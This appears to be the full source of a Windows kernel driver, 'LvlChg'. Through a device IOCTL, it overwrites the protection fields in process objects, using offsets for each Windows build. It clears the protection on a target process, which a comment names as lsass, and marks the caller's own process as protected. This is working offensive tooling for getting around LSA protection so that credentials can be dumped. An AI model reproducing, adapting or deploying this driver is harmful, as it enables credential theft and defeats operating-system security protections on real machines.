#include <ntifs.h>
#include <ntddk.h>
#include "LvlChg.h"


void LvlChgUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS LvlChgCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS LvlChgControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
WINDOWS_VERSION getWindowsVersionOffset();
NTSTATUS changeProtections(_In_ ULONG pid, _In_ WINDOWS_VERSION offset, _In_ bool protect);

typedef struct _PS_PROTECTION
{
    UCHAR Type : 3;
    UCHAR Audit : 1;
    UCHAR Signer : 4;
} PS_PROTECTION, * PPS_PROTECTION;

typedef struct _PROCESS_PROTECTION_INFO
{
    UCHAR SignatureLevel;
    UCHAR SectionSignatureLevel;
    PS_PROTECTION Protection;
} PROCESS_PROTECTION_INFO, *PPROCESS_PROTECTION_INFO;

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{

	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = LvlChgUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = LvlChgCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = LvlChgCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = LvlChgControl;


	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\LvlChg");
	PDEVICE_OBJECT deviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to create device object (0x%08X)\n", status));
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\LvlChg");
	status = IoCreateSymbolicLink(&symLink, &deviceName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to create symlink (0x%08X)\n", status));
		IoDeleteDevice(deviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}


void LvlChgUnload(_In_ PDRIVER_OBJECT DriverObject)
{

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\LvlChg");

	IoDeleteSymbolicLink(&symLink);

	IoDeleteDevice(DriverObject->DeviceObject);
}


NTSTATUS LvlChgControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_LVL_CHG_PROC:
		{
			if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(ProcessIDs))
			{
				status = STATUS_BUFFER_TOO_SMALL;
				break;
			}
			ProcessIDs* pids = (ProcessIDs*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

			if (pids == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			WINDOWS_VERSION winVerOffset = getWindowsVersionOffset();
			if (winVerOffset == 0)
			{
				status = STATUS_INTERNAL_ERROR;
				break;
			}
			DbgPrint("[*] Offset: %ul\n", winVerOffset);

			// protect our current process
			status = changeProtections(pids->currentProcessID, winVerOffset, true);
			if (!NT_SUCCESS(status))
			{
				status = STATUS_INTERNAL_ERROR;
				break;
			}

			// unprotect lsass
			status = changeProtections(pids->targetProcessID, winVerOffset, false);
			if (!NT_SUCCESS(status))
			{
				status = STATUS_INTERNAL_ERROR;
				break;
			}

			break;
		}
		default:
		{
			status = STATUS_INVALID_DEVICE_REQUEST;
			break;
		}
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}


NTSTATUS LvlChgCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}


NTSTATUS changeProtections(_In_ ULONG pid, _In_ WINDOWS_VERSION offset, _In_ bool protect)
{
	NTSTATUS status = STATUS_SUCCESS;

	PEPROCESS eProcess = NULL;
	status = PsLookupProcessByProcessId((HANDLE) pid, &eProcess);

	if (!NT_SUCCESS(status))
	{
		status = STATUS_INVALID_PARAMETER;
		return status;
	}
	
	PROCESS_PROTECTION_INFO* psProtection = (PROCESS_PROTECTION_INFO*)((ULONG_PTR)eProcess + (ULONG)offset);
	if (!protect)
	{
		psProtection->SignatureLevel		= 0;
		psProtection->SectionSignatureLevel = 0;
		psProtection->Protection.Type		= 0;
		psProtection->Protection.Audit		= 0;
		psProtection->Protection.Signer		= 0;
	}
	else
	{
		psProtection->SignatureLevel		= 0x18;
		psProtection->SectionSignatureLevel = 0x18;
		psProtection->Protection.Type		= 2;
		psProtection->Protection.Audit		= 0;
		psProtection->Protection.Signer		= 6;
	}
	ObDereferenceObject(eProcess);
		
	return status;
}


WINDOWS_VERSION getWindowsVersionOffset()
{
	RTL_OSVERSIONINFOW osVerInfo;
	osVerInfo.dwOSVersionInfoSize = sizeof(osVerInfo);

	NTSTATUS status = RtlGetVersion(&osVerInfo);

	if (!NT_SUCCESS(status))
	{
		return WINDOWS_UNSUPPORTED;
	}

	DbgPrint("[+] Windows Version %d.%d [+]\n", osVerInfo.dwMajorVersion, osVerInfo.dwBuildNumber);

	switch (osVerInfo.dwBuildNumber)
	{
	case 10240:
		return WINDOWS_THRESHOLD;

	case 10586:
		return WINDOWS_THRESHOLD_2;
		
	case 14393:
		return WINDOWS_REDSTONE;

	case 15063:
		return WINDOWS_REDSTONE_2;
		
	case 16299:
		return WINDOWS_REDSTONE_3;

	case 17134:
		return WINDOWS_REDSTONE_4;

	case 17763:
		return WINDOWS_REDSTONE_5;

	case 18362:
		return WINDOWS_19H1;

	case 18363:
		return WINDOWS_19H2;

	case 19041:
		return WINDOWS_20H1;

	case 19042:
		return WINDOWS_20H2;

	case 19043:
		return WINDOWS_21H1;

	case 19044:
		return WINDOWS_21H2;

	case 19045:
		return WINDOWS_22H2;

	case 22000:
		return WINDOWS_SUN_VALLEY;

	case 22621:
		return WINDOWS_SUN_VALLEY_2;

	case 22631:
		return WINDOWS_SUN_VALLEY_3;

	default:
		return WINDOWS_UNSUPPORTED;
	}

}
